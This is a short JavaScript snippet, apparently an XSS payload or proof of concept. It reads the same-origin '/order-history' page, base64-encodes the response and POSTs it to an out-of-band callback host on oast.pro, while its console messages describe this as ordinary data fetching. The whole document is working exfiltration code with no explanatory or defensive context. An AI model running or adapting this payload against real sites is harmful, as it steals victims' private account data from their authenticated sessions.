
const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";

async function fetchData() {
    try {
        const response = await fetch('/order-history', {
            method: 'GET'
        });
        data = btoa(await response.text());
        await fetch(url, {
            method: 'POST',
            body: data,
        });
    } catch (error) {
        console.error('Error fetching data:', error);
        throw error; // Re-throw the error for further handling
    }
}

fetchData()
    .then(() => {
        console.log('Data fetched successfully');
    })
    .catch(error => {
        console.error('Error in fetchData:', error);
    });
